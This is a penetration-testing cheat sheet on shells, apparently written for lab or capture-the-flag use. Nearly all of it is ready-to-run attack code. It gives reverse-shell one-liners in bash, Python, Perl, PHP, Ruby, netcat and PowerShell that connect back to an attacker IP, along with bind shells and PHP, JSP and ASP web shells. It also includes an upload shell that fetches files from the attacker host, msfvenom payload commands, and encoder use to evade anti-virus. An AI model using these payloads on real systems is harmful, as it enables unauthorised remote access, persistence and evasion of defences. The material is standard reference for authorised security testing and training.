# Shells

## Shells

Shell techniques are essential for penetration testers to gain access and control over target systems. This document provides commands and methods for various shell types.

### Shell Types

A shell is software that facilitates interaction with the operating system through command lines. There are three primary connection methods:

| **Type**         | **Method**                                             |
| ---------------- | ------------------------------------------------------ |
| _Reverse Shells_ | Connects back to our system                            |
| _Bind Shells_    | Waits for us to connect to the system                  |
| _Web Shells_     | Communicates through a web server over HTTP parameters |

### Reverse Shells

Reverse shells initiate a connection from the target back to the attacker's machine. They're especially useful when target systems are behind firewalls or NAT.

#### Setting Up a Listener

```bash
# Basic netcat listener
nc -lvnp 1234

# Listeners with different tools
ncat -lvnp 1234
socat TCP-LISTEN:1234,reuseaddr,fork - 
```

#### Linux Reverse Shells

**Bash TCP Socket**

```bash
bash -c "bash -i >& /dev/tcp/10.10.14.137/4444 0>&1"
```

**Bash FIFO/Pipe Method**

```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.137 4444 >/tmp/f
```

**Python Reverse Shell**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.137",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.137",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Perl Reverse Shell**

```perl
perl -e 'use Socket;$i="10.10.14.137";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**PHP Reverse Shell**

```php
php -r '$sock=fsockopen("10.10.14.137",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

**Ruby Reverse Shell**

```ruby
ruby -rsocket -e'f=TCPSocket.open("10.10.14.137",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

**Netcat Reverse Shell**

```bash
# Traditional netcat with -e
nc -e /bin/sh 10.10.14.137 4444

# Without -e option
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.137 4444 >/tmp/f
```

#### Windows Reverse Shells

**PowerShell Reverse Shell**

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.137', 4443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();
```

**PowerShell One-liner**

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.137',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$stream.Write($sbt,0,$sbt.Length);$stream.Flush()};$client.Close()"
```

**Netcat for Windows**

```cmd
nc.exe -e cmd.exe 10.10.14.137 4444
```

### Bind Shells

Bind shells open a listening port on the target, waiting for the attacker to connect.

#### Linux Bind Shell

```bash
# Create bind shell
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -l 10.129.41.200 7777 > /tmp/f

# Connect to bind shell
nc -nv 10.129.41.200 7777
```

#### Python Bind Shell

```python
python -c 'exec("""import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind(("0.0.0.0",1234));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())""")'
```

#### PowerShell Bind Shell

```powershell
powershell -NoP -NonI -W Hidden -Exec Bypass -Command $listener = [System.Net.Sockets.TcpListener]1234; $listener.start(); $client = $listener.AcceptTcpClient(); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) { $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2>&1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '> '; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2); $stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close(); $listener.Stop()
```

### Web Shells

Web shells execute commands via HTTP requests, useful when direct connections are blocked.

#### PHP Web Shell

```php
<?php system($_GET['cmd']); ?>
```

Access via: `http://target.com/shell.php?cmd=whoami`

#### PHP File Upload Shell

```php
<?php
if (isset($_REQUEST['upload'])) {
    file_put_contents($_REQUEST['upload'], file_get_contents("http://10.10.14.137/" . $_REQUEST['upload']));
};
if (isset($_REQUEST['cmd'])) {
    system($_REQUEST['cmd']);
}
?>
```

#### JSP Web Shell

```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

#### ASP/ASPX Web Shell

```asp
<% Response.Write(CreateObject("WScript.Shell").Exec(Request.QueryString("cmd")).StdOut.ReadAll()) %>
```

### Upgrading Shells

Basic shells often lack features like tab completion. These methods create more functional shells.

#### Python TTY

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

#### Full TTY Upgrade (Linux)

```bash
# Step 1: Use Python to spawn bash
python -c 'import pty; pty.spawn("/bin/bash")'

# Step 2: Background the shell with Ctrl+Z

# Step 3: Configure local terminal
stty raw -echo; fg

# Step 4: Configure terminal on victim
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 38 columns 116
```

#### Socat Fully Interactive Shell

```bash
# Attacker: Start listener
socat file:`tty`,raw,echo=0 tcp-listen:4444

# Victim: Connect back
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.137:4444
```

### Interactive Shell Creation

#### Using Perl

```bash
perl -e 'exec "/bin/sh";'
```

#### Using Ruby

```bash
ruby -e 'exec "/bin/sh"'
```

#### Using Lua

```lua
lua -e 'os.execute("/bin/sh")'
```

#### Using AWK

```bash
awk 'BEGIN {system("/bin/sh")}'
```

#### Using Find

```bash
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
find . -exec /bin/sh \; -quit
```

#### Using VIM

```bash
vim -c ':!/bin/sh'
```

### MSFvenom Payload Generation

MSFvenom can generate various shellcode payloads.

#### Linux Payloads

```bash
# Linux Meterpreter Reverse Shell
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.137 LPORT=4444 -f elf > shell.elf

# Linux Bind Shell
msfvenom -p linux/x86/shell_bind_tcp LPORT=4444 -f elf > bind.elf
```

#### Windows Payloads

```bash
# Windows Meterpreter Reverse TCP Shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.137 LPORT=4444 -f exe > shell.exe

# Windows Bind Shell
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe > bind.exe

# Windows Encoded Meterpreter Windows Reverse Shell
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 -f exe LHOST=10.10.14.137 LPORT=4444 > encoded.exe
```

#### Web Payloads

```bash
# PHP Meterpreter Reverse TCP
msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.14.137 LPORT=4444 -f raw > shell.php

# ASP Meterpreter Reverse TCP
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.137 LPORT=4444 -f asp > shell.asp

# JSP Java Meterpreter Reverse TCP
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.137 LPORT=4444 -f raw > shell.jsp
```

### Common Issues and Solutions

#### Shell Stability Issues

Problem: Shell dies unexpectedly Solution: Try different shell types or full TTY upgrade

#### Firewall Restrictions

Problem: Can't establish direct connections Solution: Use common ports (80, 443, 8080) or try ICMP/DNS tunneling

#### Non-Interactive Commands

Problem: Commands like su, ssh require TTY Solution: Upgrade shell to full TTY

#### Command Output Encoding

Problem: Binary data corrupts terminal Solution: Base64 encode output before transferring

```bash
cat /bin/ls | base64
echo "base64_string" | base64 -d > ls
chmod +x ls
```

#### Anti-Virus Detection

Problem: Payloads detected by AV Solution: Use encoders or obfuscation techniques

```bash
msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 10 LHOST=10.10.14.137 LPORT=4444 -f exe > encoded.exe
```
